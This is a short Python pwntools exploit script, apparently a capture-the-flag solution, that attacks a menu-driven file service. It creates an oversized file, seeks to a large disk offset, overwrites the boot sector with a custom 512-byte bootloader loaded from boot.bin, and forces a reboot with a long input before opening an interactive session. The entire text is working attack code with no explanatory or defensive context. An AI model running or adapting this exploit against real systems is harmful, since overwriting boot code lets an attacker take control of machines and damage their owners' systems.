from pwn import *
from time import sleep

if args.HOST and args.PORT:
    p = remote(args.HOST, args.PORT)
else:
    p = remote("localhost", 5000)

def wait():
    p.recvuntil(delim)

bootcode = open("boot.bin", "rb").read()
assert len(bootcode) == 512
delim = b"8. write file\n"
p.newline = b'\r\n'


wait()
print(f"[+] creating file")
p.send(b"7\ntmp\n9999999999999999\n")
wait()
print(f"[+] seeking to offset")
p.send(b"6\n137438437376\n")
wait()
print(f"[+] writing new bootloader")
p.send(b"8\n512\n" + bootcode + b"\n")
wait()
print(f"[+] disabling echo")
p.send(b"3\n")
wait()
print(f"[+] rebooting remote")
p.send(b"1\n" + b"{" * 0x2000 + b"\n")

p.interactive()